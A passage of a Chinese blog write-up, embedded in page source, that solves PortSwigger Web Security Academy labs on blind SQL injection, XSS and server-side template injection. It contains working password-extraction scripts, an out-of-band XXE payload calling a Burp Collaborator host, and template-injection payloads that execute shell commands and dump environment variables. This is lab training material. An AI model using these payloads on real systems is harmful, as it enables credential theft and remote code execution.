src="'+A+'" alt="image-20221112215832981"></p><p>我们再用<code>&#39; AND (SELECT &#39;a&#39; FROM users WHERE username=&#39;administrator&#39; AND LENGTH(password)&gt;1)=&#39;a</code>这条语句来判断administrator这个用户的密码长度是否大于1，返回为真</p><p><img src="'+F+'" alt="image-20221113171121705"></p><p>通过一系列手注判断出来，administrator的密码长度为20位（😨傻眼？？）</p><p><img src="'+W+`" alt="image-20221113171425361"></p><p>接下来就是逐字符爆破密码了，使用<code>&#39; AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username=&#39;administrator&#39;)=&#39;a</code>语句来判断第一个字符是不是a，接着我们构建类似的语句来逐字符判断，这里可以使用Intruder，不过我更喜欢用python，这里直接给出一个我写的脚本（单线程非常非常慢，试着写了下多线程，🥬码力不精轻喷🥺）</p><div class="language-python line-numbers-mode" data-highlighter="prismjs" data-ext="py" data-title="py"><pre class="language-python"><code><span class="line"><span class="token keyword">import</span> requests</span>
<span class="line"><span class="token keyword">import</span> threading</span>
<span class="line"><span class="token keyword">import</span> time</span>
<span class="line"><span class="token keyword">import</span> re</span>
<span class="line"></span>
<span class="line"><span class="token keyword">def</span> <span class="token function">get_pass</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> char<span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">    url <span class="token operator">=</span> <span class="token string">&#39;https://0af2001e046c8c13c012318000590007.web-security-academy.net/filter?category=Pets&#39;</span></span>
<span class="line">    headers <span class="token operator">=</span> <span class="token punctuation">{</span></span>
<span class="line">        <span class="token string">&#39;User-Agent&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0&#39;</span><span class="token punctuation">}</span></span>
<span class="line">    cookies <span class="token operator">=</span> <span class="token punctuation">{</span></span>
<span class="line">        <span class="token string">&quot;TrackingId&quot;</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f&quot;wIqZZ59H8RfHNV9L&#39; AND (SELECT SUBSTRING(password,</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">,1) FROM users WHERE username=&#39;administrator&#39;)=&#39;</span><span class="token interpolation"><span class="token punctuation">{</span>char<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">}</span></span>
<span class="line">    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span></span>
<span class="line">    regex <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r&quot;Welcome back!&quot;</span><span class="token punctuation">,</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span></span>
<span class="line">    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">        passlist<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> char</span>
<span class="line">        password <span class="token operator">=</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>passlist<span class="token punctuation">)</span></span>
<span class="line">        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;The password is </span><span class="token interpolation"><span class="token punctuation">{</span>password<span class="token punctuation">}</span></span><span class="token string">&#39;</span></span><span class="token punctuation">)</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span></span>
<span class="line">    chars <span class="token operator">=</span> <span class="token string">&#39;abcdefghijklmnopqrstuvwxyz0123456789&#39;</span></span>
<span class="line">    length <span class="token operator">=</span> <span class="token number">20</span></span>
<span class="line">    passlist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&#39;&#39;</span><span class="token punctuation">]</span><span class="token operator">*</span>length</span>
<span class="line">    start <span class="token operator">=</span> time<span class="token punctuation">.</span>perf_counter<span class="token punctuation">(</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> length<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">        thread_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span></span>
<span class="line">        <span class="token keyword">for</span> char <span class="token keyword">in</span> chars<span class="token punctuation">:</span></span>
<span class="line">            thread <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>get_pass<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">[</span>i<span class="token punctuation">,</span> char<span class="token punctuation">]</span><span class="token punctuation">)</span></span>
<span class="line">            thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span></span>
<span class="line">            thread_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>thread<span class="token punctuation">)</span></span>
<span class="line">        <span class="token keyword">for</span> t <span class="token keyword">in</span> thread_list<span class="token punctuation">:</span></span>
<span class="line">            t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span>
<span class="line">    finish <span class="token operator">=</span> time<span class="token punctuation">.</span>perf_counter<span class="token punctuation">(</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;It takes </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">round</span><span class="token punctuation">(</span>finish <span class="token operator">-</span> start<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string"> s&quot;</span></span><span class="token punctuation">)</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="`+Q+'" alt="image-20221113213111798"></p><p>获得密码，我们尝试登录administrator，成功解决Lab</p><p><img src="'+H+'" alt="image-20221113213148104"></p><h2 id="带有条件错误的sql盲注" tabindex="-1"><a class="header-anchor" href="#带有条件错误的sql盲注"><span>带有条件错误的SQL盲注</span></a></h2><blockquote><p>首先我们先了解一下如何测试单个布尔条件并在条件为真时触发数据库错误：</p><table><thead><tr><th>数据库</th><th>语句</th></tr></thead><tbody><tr><td>甲骨文</td><td>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual</td></tr><tr><td>微软</td><td>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END</td></tr><tr><td>PostgreSQL</td><td>1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN CAST(1/0 AS INTEGER) ELSE NULL END)</td></tr><tr><td>MySQL</td><td>SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),&#39;a&#39;)</td></tr></tbody></table><p><strong>分析一下表达式：</strong></p><p>如果CONDITION为真，则执行to_char(1/0)或者是1/0，因为出现了除0的错误，所以返回报错Internal Server Error；反之，CONDITION为假时，执行NULL返回NULL不报错，页面正常显示内容。</p></blockquote><p><strong>看了眼hint得知Lab使用的是Oracle数据库，直接把上一题的脚本改改就能用，把正则匹配的内容改为Internal Server Error，或者是判断response的状态码。</strong></p><p>这里我们构造先一个子查询<code>&#39;|| (SELECT CASE WHEN (length(password)&gt;1) THEN TO_CHAR(1/0) ELSE NULL END FROM users where username=&#39;administrator&#39;)||&#39;</code>来判断密码长度，以此类推最终判断出来密码长度是20</p><p><img src="'+z+`" alt="image-20221115215315673"></p><p>有了上一Lab的经验，我们直接上脚本，爆破一下密码</p><div class="language-python line-numbers-mode" data-highlighter="prismjs" data-ext="py" data-title="py"><pre class="language-python"><code><span class="line"><span class="token keyword">import</span> requests</span>
<span class="line"><span class="token keyword">import</span> threading</span>
<span class="line"><span class="token keyword">import</span> time</span>
<span class="line"><span class="token keyword">import</span> re</span>
<span class="line"></span>
<span class="line"><span class="token keyword">def</span> <span class="token function">get_pass</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> char<span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">    url <span class="token operator">=</span> <span class="token string">&#39;https://0a580032035afa26c09136e300d100e0.web-security-academy.net/filter?category=Pets&#39;</span></span>
<span class="line">    headers <span class="token operator">=</span> <span class="token punctuation">{</span></span>
<span class="line">        <span class="token string">&#39;User-Agent&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0&#39;</span><span class="token punctuation">}</span></span>
<span class="line">    cookies <span class="token operator">=</span> <span class="token punctuation">{</span></span>
<span class="line">        <span class="token string">&quot;TrackingId&quot;</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f&quot;wIqZZ59H8RfHNV9L&#39;||(select case when substr(password,</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">,1)=&#39;</span><span class="token interpolation"><span class="token punctuation">{</span>char<span class="token punctuation">}</span></span><span class="token string">&#39; then to_char(1/0) else NULL end from users where username=&#39;administrator&#39;)||&#39;&quot;</span></span><span class="token punctuation">}</span></span>
<span class="line">    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span></span>
<span class="line">    regex <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r&quot;Internal Server Error&quot;</span><span class="token punctuation">,</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span></span>
<span class="line">    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">        passlist<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> char</span>
<span class="line">        password <span class="token operator">=</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>passlist<span class="token punctuation">)</span></span>
<span class="line">        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;The password is </span><span class="token interpolation"><span class="token punctuation">{</span>password<span class="token punctuation">}</span></span><span class="token string">&#39;</span></span><span class="token punctuation">)</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span></span>
<span class="line">    chars <span class="token operator">=</span> <span class="token string">&#39;abcdefghijklmnopqrstuvwxyz0123456789&#39;</span></span>
<span class="line">    length <span class="token operator">=</span> <span class="token number">20</span></span>
<span class="line">    passlist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&#39;&#39;</span><span class="token punctuation">]</span><span class="token operator">*</span>length</span>
<span class="line">    start <span class="token operator">=</span> time<span class="token punctuation">.</span>perf_counter<span class="token punctuation">(</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> length<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">        thread_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span></span>
<span class="line">        <span class="token keyword">for</span> char <span class="token keyword">in</span> chars<span class="token punctuation">:</span></span>
<span class="line">            thread <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>get_pass<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">[</span>i<span class="token punctuation">,</span> char<span class="token punctuation">]</span><span class="token punctuation">)</span></span>
<span class="line">            thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span></span>
<span class="line">            thread_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>thread<span class="token punctuation">)</span></span>
<span class="line">        <span class="token keyword">for</span> t <span class="token keyword">in</span> thread_list<span class="token punctuation">:</span></span>
<span class="line">            t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span></span>
<span class="line">    finish <span class="token operator">=</span> time<span class="token punctuation">.</span>perf_counter<span class="token punctuation">(</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;It takes </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">round</span><span class="token punctuation">(</span>finish <span class="token operator">-</span> start<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string"> s&quot;</span></span><span class="token punctuation">)</span></span>
<span class="line"></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="`+G+'" alt="image-20221120104000722"></p><p>这里使用intruder也可以得到相同结果 <img src="'+Y+'" alt="image-20221120105032212"></p><p>获得密码，尝试登录administrator，成功解决Lab</p><p><img src="'+X+'" alt="image-20221120103940765"></p><h2 id="带有时间延时的sql注入" tabindex="-1"><a class="header-anchor" href="#带有时间延时的sql注入"><span>带有时间延时的SQL注入</span></a></h2><blockquote><p>任务是造成一个十秒的延时，首先了解一下如何在处理查询时，使数据库出现<strong>时间延迟</strong>：</p><table><thead><tr><th>数据库</th><th>语句</th></tr></thead><tbody><tr><td>甲骨文</td><td>dbms_pipe.receive_message((&#39;a&#39;),10)</td></tr><tr><td>微软</td><td>WAITFOR DELAY &#39;0:0:10&#39;</td></tr><tr><td>PostgreSQL</td><td>SELECT pg_sleep(10)</td></tr><tr><td>MySQL</td><td>SELECT SLEEP(10)</td></tr></tbody></table></blockquote><p>这里我们只需要在注入点插入一个延时语句即可解决lab</p><p><img src="'+Z+'" alt="image-20221120111356248"></p><p><img src="'+V+`" alt="image-20221120111406745"></p><p>payload：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre class="language-text"><code><span class="line">TrackingId=BDiRNvzhMTPO0qtL&#39;||pg_sleep(10)--;</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="带有时间延迟和信息检索的sql盲注" tabindex="-1"><a class="header-anchor" href="#带有时间延迟和信息检索的sql盲注"><span>带有时间延迟和信息检索的SQL盲注</span></a></h2><h2 id="oob盲注" tabindex="-1"><a class="header-anchor" href="#oob盲注"><span>OOB盲注</span></a></h2><p><img src="`+J+'" alt="image-20221120115115857"></p><p>b5hpcwzn3c60fubud2jmosu1bshk59.burpcollaborator.net</p><p><img src="'+K+'" alt="image-20221120115418060"></p><p><img src="'+$+`" alt="image-20221120115235579"></p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre class="language-text"><code><span class="line">TrackingId=x&#39;+UNION+SELECT+EXTRACTVALUE(xmltype(&#39;&lt;%3fxml+version%3d&quot;1.0&quot;+encoding%3d&quot;UTF-8&quot;%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+&quot;http%3a//BURP-COLLABORATOR-SUBDOMAIN/&quot;&gt;+%25remote%3b]&gt;&#39;),&#39;/l&#39;)+FROM+dual--</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="" tabindex="-1"><a class="header-anchor" href="#"><span>------------------------------</span></a></h2><h1 id="xss" tabindex="-1"><a class="header-anchor" href="#xss"><span><strong>XSS</strong></span></a></h1><p><img src="`+ss+'" alt="image-20221120120155457"></p><blockquote><p><strong>跨站点脚本（也称为 XSS）是一种网络安全漏洞，允许攻击者破坏用户与易受攻击的应用程序的交互。它允许攻击者规避同源策略，该策略旨在将不同的网站彼此隔离。跨站点脚本漏洞通常允许攻击者伪装成受害用户，执行用户能够执行的任何操作，并访问用户的任何数据。如果受害用户在应用程序中具有特权访问权限，则攻击者可能能够完全控制应用程序的所有功能和数据。</strong></p></blockquote><h2 id="无编码反射型xss" tabindex="-1"><a class="header-anchor" href="#无编码反射型xss"><span>无编码反射型XSS</span></a></h2><p><img src="'+as+'" alt="image-20221120121500672"></p><p><img src="'+ns+'" alt="image-20221120121514302"></p><h2 id="-1" tabindex="-1"><a class="header-anchor" href="#-1"><span>------------------------------</span></a></h2><h1 id="ssti" tabindex="-1"><a class="header-anchor" href="#ssti"><span><strong>SSTI</strong></span></a></h1><p><img src="'+es+'" alt="image-20230121195535830"></p><blockquote><p>服务端模板注入是指攻击者能够利用模板自身语法将恶意负载注入模板，然后在服务端执行。</p><p>模板引擎被设计成通过结合固定模板和可变数据来生成网页。当用户输入直接拼接到模板中，而不是作为数据传入时，可能会发生服务端模板注入攻击。这使得攻击者能够注入任意模板指令来操纵模板引擎，从而能够完全控制服务器。顾名思义，服务端模板注入有效负载是在服务端交付和执行的，这可能使它们比典型的客户端模板注入更危险。</p></blockquote><blockquote><p>服务端模板注入漏洞会使网站面临各种攻击，具体取决于所讨论的模板引擎以及应用程序如何使用它。在极少数情况下，这些漏洞不会带来真正的安全风险。然而，大多数情况下，服务端模板注入的影响可能是灾难性的。</p><p>最严重的情况是，攻击者有可能完成远程代码执行，从而完全控制后端服务器，并利用它对内部基础设施进行其他攻击。</p><p>即使在不可能完全执行远程代码的情况下，攻击者通常仍可以使用服务端模板注入作为许多其他攻击的基础，从而可能获得服务器上敏感数据和任意文件的访问权限。</p><p>当用户输入直接拼接到模板中而不是作为数据传入时，就会出现服务端模板注入漏洞。</p></blockquote><h2 id="basic-server-side-template-injection" tabindex="-1"><a class="header-anchor" href="#basic-server-side-template-injection"><span>Basic server-side template injection</span></a></h2><p>靶场要求：</p><blockquote><p>由于ERB模板的不安全构造，此实验室容易受到服务器端模板注入的影响。 要解决这个问题，请查看ERB文档，了解如何执行任意代码，然后从Carlos的主目录中删除morale.txt文件。</p></blockquote><p>实验步骤：</p><p>随便点击一个商品详细，请求的message可控，且能回显到页面上，目标注入点就在这里</p><p><img src="'+ts+'" alt="image-20230121201829437"></p>',155),an={href:"https://docs.ruby-lang.org/en/master/ERB.html",target:"_blank",rel:"noopener noreferrer"},nn=t('<p><img src="'+ps+'" alt="image-20230121202308832"></p><p><img src="'+os+'" alt="image-20230121202402896"></p><p>再查一下RUBY如何执行shell命令，使用exec和system均可，区别是：<strong>exec会替换当前进程，system返回执行结果(布尔值)</strong></p><p><img src="'+is+'" alt="image-20230121204039682"></p><p><img src="'+ls+'" alt="image-20230121204108869"></p><p>于是我们在修改message请求内容为<code>&lt;%= system &#39;ls&#39; %&gt;</code>，查看目录下文件列表<img src="'+cs+'" alt="image-20230121204729823"></p><p>接着修改为<code>&lt;%= system &#39;rm morale.txt&#39; %&gt;</code>，删除moral.txt文件</p><p><img src="'+rs+'" alt="image-20230121205034621"></p><h2 id="basic-server-side-template-injection-code-context" tabindex="-1"><a class="header-anchor" href="#basic-server-side-template-injection-code-context"><span>Basic server-side template injection (code context)</span></a></h2><p>靶场要求：</p><blockquote><p>由于使用Tornado模板的方式不安全，该实验室容易受到服务器端模板注入的影响。要解决这个问题，请查看Tornado文档，了解如何执行任意代码，然后从Carlos的主目录中删除morale.txt文件。 您可以使用以下凭据登录到自己的帐户：wiener:peter</p></blockquote><p>实验步骤：</p><p>登录用户，然后抓取提交<strong>Preferred name</strong>的数据包，发现是通过一个POST请求设置<code>blog-post-author-display</code>字段的参数，取值为：<code>user.name</code>，<code>user.first_name</code>或<code>user.nickname</code></p><p><img src="'+us+'" alt="image-20230121212356539"></p><p><img src="'+ds+'" alt="image-20230121212310205"></p>',15),en={href:"https://tornado-zh.readthedocs.io/zh/latest/template.html#",target:"_blank",rel:"noopener noreferrer"},tn=s("code",null,"{{ python expression }}",-1),pn=s("p",null,[s("img",{src:gs,alt:"image-20230121213025258"})],-1),on=s("p",null,[s("img",{src:ms,alt:"image-20230121213314589"})],-1),ln=s("p",null,[a("于是我们将"),s("code",null,"blog-post-author-display=user.name"),a("修改为"),s("code",null,"blog-post-author-display=user.name}}{{7*7"),a("，再打开随便一篇文章，在文章评论区评论，将昵称回显出来。发现页面返回了49，确实存在模板注入")],-1),cn=s("p",null,[s("img",{src:ks,alt:"image-20230121214406213"})],-1),rn={href:"https://tornado-zh.readthedocs.io/zh/latest/template.html#id1",target:"_blank",rel:"noopener noreferrer"},un=s("code",null,"blog-post-author-display=user.name",-1),dn=s("code",null,'blog-post-author-display=user.name}}{{__import__("os").popen("ls").read()',-1),gn=t('<p><img src="'+bs+'" alt="image-20230121215425444"></p><p>最后执行删除moral.txt文件的命令（修改为<code>blog-post-author-display=user.name}}{{__import__(&quot;os&quot;).popen(&quot;rm morale.txt&quot;).read()</code>）就成功解决了Lab</p><p><img src="'+hs+'" alt="image-20230121215722468"></p><h2 id="server-side-template-injection-using-documentation" tabindex="-1"><a class="header-anchor" href="#server-side-template-injection-using-documentation"><span>Server-side template injection using documentation</span></a></h2><p>靶场要求：</p><blockquote><p>此实验室易受服务器端模板注入的影响。要解决这个问题，请确定模板引擎并使用文档来确定如何执行任意代码，然后从Carlos的主目录中删除morale.txt文件。 您可以使用以下凭据登录到自己的帐户：<code>content-manager:C0nt3ntM4n4g3r</code></p></blockquote><p>实验步骤：</p><p>登录用户，编辑模板，直接给了模板注入的一个测试页面，还支持预览</p><p><img src="'+_s+'" alt="image-20230121221153611"></p>',9),mn={href:"http://freemarker.foofun.cn/app_faq.html#faq_template_uploading_security",target:"_blank",rel:"noopener noreferrer"},kn=s("strong",null,"虽然new不会实例化不是TemplateModel-s的类，但FreeMarker包含一个TemplateModel类，可用于创建任意Java对象",-1),bn=s("p",null,[s("img",{src:vs,alt:"image-20230121221028401"})],-1),hn={href:"http://freemarker.foofun.cn/ref_builtins_expert.html#ref_builtin_new",target:"_blank",rel:"noopener noreferrer"},_n=s("strong",null,"freemarker.template.utility",-1),vn=s("strong",null,"Execute",-1),fn=t('<p><img src="'+fs+'" alt="image-20230121221556207"></p><p><code>&lt;#assign test=&quot;freemarker.template.utility.Execute&quot;?new()&gt;${test(&quot;ls&quot;)}</code></p><p><img src="'+ys+'" alt="image-20230121222227366"></p><p><code>&lt;#assign test=&quot;freemarker.template.utility.Execute&quot;?new()&gt;${test(&quot;ls&quot;)}</code></p><p><img src="'+ws+'" alt="image-20230121222440470"></p><h2 id="server-side-template-injection-in-an-unknown-language-with-a-documented-exploit" tabindex="-1"><a class="header-anchor" href="#server-side-template-injection-in-an-unknown-language-with-a-documented-exploit"><span>Server-side template injection in an unknown language with a documented exploit</span></a></h2><p>靶场要求：</p><blockquote><p>此实验室易受服务器端模板注入的影响。要解决实验室问题，请识别模板引擎并在线查找可用于执行任意代码的漏洞，然后从Carlos的主目录中删除morale.txt文件。</p></blockquote><p>实验步骤：</p><p>随便点击一个商品详细，请求的message可控，且能回显到页面上，目标注入点就在这里，尝试提交<code>${{&lt;%[%&#39;&quot;}}%\\</code>fuzz测试一下，回显报错显示使用的是<strong>handlebars</strong></p><p><img src="'+qs+'" alt="image-20230121223137509"></p>',11),yn={href:"https://xz.aliyun.com/t/4695",target:"_blank",rel:"noopener noreferrer"},wn=t(`<div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js" data-title="js"><pre class="language-javascript"><code><span class="line"><span class="token punctuation">{</span><span class="token punctuation">{</span>#<span class="token keyword">with</span> <span class="token string">&quot;s&quot;</span> <span class="token keyword">as</span> <span class="token operator">|</span>string<span class="token operator">|</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">  <span class="token punctuation">{</span><span class="token punctuation">{</span>#<span class="token keyword">with</span> <span class="token string">&quot;e&quot;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">    <span class="token punctuation">{</span><span class="token punctuation">{</span>#<span class="token keyword">with</span> split <span class="token keyword">as</span> <span class="token operator">|</span>conslist<span class="token operator">|</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">      <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>pop<span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">      <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">push</span> <span class="token punctuation">(</span>lookup string<span class="token punctuation">.</span>sub <span class="token string">&quot;constructor&quot;</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">      <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>pop<span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">      <span class="token punctuation">{</span><span class="token punctuation">{</span>#<span class="token keyword">with</span> string<span class="token punctuation">.</span>split <span class="token keyword">as</span> <span class="token operator">|</span>codelist<span class="token operator">|</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">        <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>pop<span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">        <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>push <span class="token string">&quot;return JSON.stringify(process.env);&quot;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">        <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>pop<span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">        <span class="token punctuation">{</span><span class="token punctuation">{</span>#each conslist<span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">          <span class="token punctuation">{</span><span class="token punctuation">{</span>#<span class="token keyword">with</span> <span class="token punctuation">(</span>string<span class="token punctuation">.</span>sub<span class="token punctuation">.</span>apply <span class="token number">0</span> codelist<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">            <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">          <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token operator">/</span><span class="token keyword">with</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">        <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token operator">/</span>each<span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">      <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token operator">/</span><span class="token keyword">with</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">    <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token operator">/</span><span class="token keyword">with</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">  <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token operator">/</span><span class="token keyword">with</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line"><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token operator">/</span><span class="token keyword">with</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
